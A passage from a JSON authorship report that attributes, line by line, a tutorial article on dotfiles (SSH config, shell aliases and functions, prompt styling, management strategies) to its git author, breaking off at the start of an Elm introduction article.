      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Host remoteA"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    Hostname remoteAserver.com"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    User john"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    IdentityFile ~/.ssh/id_rsa"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "With the configurations above, John is now able to simply just run the following to connect to `remoteA`:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "ssh remoteA"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "This evidently saves time and effort needed to connect to a server. Aside from just connecting to servers, `ssh` can also be used for other purposes, all of which are easily [configurable](https://www.ssh.com/ssh/config) using dotfiles. These include [SSH proxies](https://www.cyberciti.biz/faq/linux-unix-ssh-proxycommand-passing-through-one-host-gateway-server/), [launching GUI applications remotely](https://www.nics.tennessee.edu/x11_forwarding) and [SSH forwarding](https://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/)."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cbox type\u003d\"warning\"\u003e"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Please ensure that your RSA private keys such as `~/.ssh/id_rsa` are kept safe at all times."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "#### Benefit 2: Personalised Shortcuts and Commands"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Dotfiles allow users to create custom shortcuts and commands, including aliases, functions and key-bindings, that can tremendously improve productivity. These can be both system level and project specific. In this section, we will look into aliases and functions."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 2.1: Aliases"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "An alias is a shortcut command to a longer and more complex command. A new alias is defined by assigning a string with the command to a name in the format `alias \u003cname\u003e\u003d\u003ccommand\u003e`. Aliases are often set in the `~/.bashrc` or `~/.zshrc` file. The examples below illustrate the use of aliasing."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias c\u003d\u0027clear\u0027"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias lf\u003d\u0027/bin/ls --color -CF\u0027"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias ll\u003d\u0027ls -l --color\u003dauto\u0027"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias ls\u003d\u0027ls --color\u003dauto\u0027"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias r\u003d\u0027fc -s\u0027"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "alias vi\u003d\u0027vim\u0027"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "In this case, a user is able to type `c` instead of typing out `clear` in order to clear the terminal screen, a very commonly used command. Aliases are especially useful for abstracting long commands that are used often, and when compounded can save the user a lot of time and effort."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 2.2: Functions"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Much like aliases, functions allows a user to abstract longer commands into short commands. However, there is additional functionality such as being able to pass command line [arguments](https://tecadmin.net/tutorial/bash-scripting/bash-command-arguments/) and [flags](https://stackoverflow.com/questions/192249/how-do-i-parse-command-line-arguments-in-bash). This makes the commands more extensible and reuseable for a wide array of functionality."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "The example function `mcd` below takes in a single argument represented by `$1`, creates a directory with the same name and enters it in a single command."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "function mcd() {"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  mkdir -p $1;"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  cd $1;"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "}"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "So if the user were to type the following into the terminal:"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "mcd my_folder"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "it would create a folder called `my_folder` and enter into it in a single step."
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "A highly useful and commonly used function is the `extract` function. This combines a lot of utilities to allow you to decompress just about any compressed file format, such as `tar`, `rar` and `zip`:"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "function extract() {"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": " if [ -z \"$1\" ]; then"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    # display usage if no parameters given"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    echo \"Usage: extract \u003cpath/file_name\u003e.\u003czip|rar|bz2|gz|tar|tbz2|tgz|Z|7z|xz|ex|tar.bz2|tar.gz|tar.xz\u003e\""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    echo \"       extract \u003cpath/file_name_1.ext\u003e [path/file_name_2.ext] [path/file_name_3.ext]\""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    return 1"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": " else"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    for n in $@"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    do"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "      if [ -f \"$n\" ] ; then"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "          case \"${n%,}\" in"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.tar.bz2|*.tar.gz|*.tar.xz|*.tbz2|*.tgz|*.txz|*.tar) "
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "                         tar xvf \"$n\"       ;;"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.lzma)      unlzma ./\"$n\"      ;;"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.bz2)       bunzip2 ./\"$n\"     ;;"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.rar)       unrar x -ad ./\"$n\" ;;"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.gz)        gunzip ./\"$n\"      ;;"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.zip)       unzip ./\"$n\"       ;;"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.z)         uncompress ./\"$n\"  ;;"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.7z|*.arj|*.cab|*.chm|*.deb|*.dmg|*.iso|*.lzh|*.msi|*.rpm|*.udf|*.wim|*.xar)"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "                         7z x ./\"$n\"        ;;"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.xz)        unxz ./\"$n\"        ;;"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *.exe)       cabextract ./\"$n\"  ;;"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "            *)"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "                         echo \"extract: \u0027$n\u0027 - unknown archive method\""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "                         return 1"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "                         ;;"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "          esac"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "      else"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "          echo \"\u0027$n\u0027 - file does not exist\""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "          return 1"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "      fi"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    done"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "fi"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "}"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "```"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "The use of functions essentially allows a user to create custom command-line tools to suit their needs."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Defining the function above in `~/.bashrc` or `./.zshrc` will load it whenever a new shell is created."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "#### Benefit 3: Shell Styling and Utility"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Dotfiles are also used to style shells (e.g. `bash`, `zsh`, `fish`) and enhance or add features to them. The styling of shells not only improves the overall aesthetic, it also makes them more readable (shell output can be tedious to read and digest). Features such as adding system information to the prompt, tab completion and syntax highlighting also improves the overall utility and feedback of the shell, contributing to a better developer experience."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 3.1: Prompt"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "The `PS1` environment variable provides information for configuring and styling the Shell prompt. "
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "By default, `PS1` is set to display only the username, host name and current working directory in the prompt."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cpic src\u003d\"default-prompt.png\" alt\u003d\"Default prompt\" width\u003d\"55%\"\u003e"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  \u003csub\u003e _Figure 2. Default prompt_ \u003c/sub\u003e"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "`PS1` can be [configured](https://www.cyberciti.biz/tips/howto-linux-unix-bash-shell-setup-prompt.html) to add (or remove) features, such as status code of the previous command, git branch, git status, dates, etc. In Figure 3 below, the prompt is able to detect and show the git branch and status when it is inside a git repository, a useful and convenient feature for developers."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cpic src\u003d\"enhanced-prompt.png\" alt\u003d\"Enhanced prompt\" width\u003d\"55%\"\u003e"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  \u003csub\u003e _Figure 3. Enhanced prompt_ \u003c/sub\u003e"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 3.2: Tab Completion"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Tab completion is a feature that allows the user to select options from a drop down menu. This is a default feature when using `zsh`, but can be configured using dotfiles when using other shells like `bash`."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cpic src\u003d\"cd-autocomplete.gif\" alt\u003d\"Git flag autocomplete\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  \u003csub\u003e _Figure 4. `cd` tab completion [(Tutorial)](https://scriptingosx.com/2019/07/moving-to-zsh-part-5-completions/)_ \u003c/sub\u003e"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Tab completion can also be used for other purposes, such as selecting flags from a drop down menu, complete with an accompanying description."
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cpic src\u003d\"git-flag-autocomplete.gif\" alt\u003d\"Git flag autocomplete\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  \u003csub\u003e _Figure 5. Flag autocomplete_ \u003c/sub\u003e"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "##### Feature 3.3: Syntax Highlighting"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Dotfiles are also often used to style and colorise the terminal. This is not just for aesthetic reasons - the use of color enhances readability of programs and makes it easier to debug. One such example would be the use of **syntax highlighting** as seen in Figure 6 below. It is especially useful for long shell commands, escape sequences or string interpolation."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cpic src\u003d\"syntax-highlighting.gif\" alt\u003d\"Git flag autocomplete\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  \u003csub\u003e _Figure 6. Syntax Highlighting [(Tutorial)](https://github.com/zsh-users/zsh-syntax-highlighting)_ \u003c/sub\u003e"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "### Management Strategies"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "There are many stratgies for managing dotfiles, but virtually all of them revolve around storing them in `git` repositories. The nature of dotfiles make `git` and ideal management tool - they continously evolve over time as the user adds more configurations, and it may be useful to track old dotfiles for future reference."
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Another major benefit of managing dotfiles with `git` is that they can then be pushed to online repositories like GitHub or GitLab. These dotfiles can then be easily reused on other systems by simply pulling from these online repositories, allowing users to port their painstakingly created dotfiles anywhere. Since certain dotfiles may also vary across different systems (e.g. bash configurations may be different), users can use different branches to differentiate between these systems. It almost seems as though `git` was created for managing dotfiles!"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "The main difference between different strategies are how these dotfiles should be linked from the git repository into the system, since dotfiles can exist in different directories. The 3 most commonly used strategies are detailed below:"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "1. **Use a [git worktree](https://www.atlassian.com/git/tutorials/dotfiles):**\\"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "The strategy uses a lesser-known Git functionality of storing the Git worktree separately from the Git directory. This consists of a Git bare repository in a \"side\" folder (like `$HOME/.cfg` or `$HOME/.myconfig`) using a specially crafted alias so that commands are run against that repository and not the usual .git local folder, which would interfere with any other Git repositories around."
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "2. **Use [symlinking](https://opensource.com/article/19/3/move-your-dotfiles-version-control):**\\"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "This strategy involves using symlinks (The `ln` command) to create a shortcut linking to the dotfiles repository. The `ln` command is used to create links in your (unix-based) system. The syntax is `ln -s \u003cactual location of the file\u003e \u003cname and location you want to see that file under\u003e`. For example, the command below will result in the gitconfig in the dotfiles directory to be accessible from the `~/.gitconfig` location, which is where Git is expecting to see all the Git preferences set."
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "  "
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    ln -s ~/dotfiles/gitconfig ~/.gitconfig"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "3. **Use an existing dotfiles management tool such as [yadm](https://yadm.io/):**"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "`yadm` is a command-line tool for managing dotfiles. It provides many features out of the box, which saves the user the time needed to manually configure his/her own dotfiles. It also supplies additional features, such as the ability to manage a subset of secure files, which are encrypted before they are included in the repository. However, the caveat of this strategy is that it requires new systems to have `yadm` installed, which significantly reduces the portability."
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003cbox type\u003d\"warning\"\u003e"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "Before copying dotfiles over to a system, ensure that there is a backup of the local dotfiles so they are not overwritten."
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "### Getting Started"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "It is easy to get started with dotfiles - a simple way to start is just by adding aliases for commonly used commands! For developers looking to optimise their productivity even further with dotfiles beyond the examples in this article, here are some useful readings/resources to get started with dotfiles:"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- [Unofficial Guide to Dotfiles on GitHub](https://dotfiles.github.io/)"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- [Introduction to Dotfiles](https://thoughtbot.com/upcase/videos/intro-to-dotfiles)"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "- [Awesome dotfiles: A curated list of dotfiles resources.](https://github.com/webpro/awesome-dotfiles)"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "### Conclusion"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "In a nutshell, dotfiles are highly useful tools that can provide virtually unlimited customisability, and can tremendously improve the productivity of a developer. For junior developers that are keen on improve their linux or shell scripting knowledge, dotfiles are a good way to get started."
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": ""
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "tiuweehan"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "tiuweehan": 264
    }
  },
  {
    "path": "contents/elm/Elm.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  title: Introduction to Elm"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "openorclose"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "openorclose"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "openorclose"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "openorclose"
        },
        "content": "* [Introduction to Elm‎](#introduction-to-elm)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    * [What Is Elm?‎](#what-is-elm)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    * [Why Learn Elm?](#why-learn-elm)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: Handling All Cases](#benefit-handling-all-cases)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: Friendly Compiler](#benefit-friendly-compiler)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: Canonical Coding Style‎](#benefit-canonical-coding-style)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: Package Ecosystem](#benefit-package-ecosystem)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: Fast Compiles and Small Bundles](#benefit-fast-compiles-and-small-bundles)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        * [Benefit: The Elm Way](#benefit-the-elm-way)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "openorclose"
        },
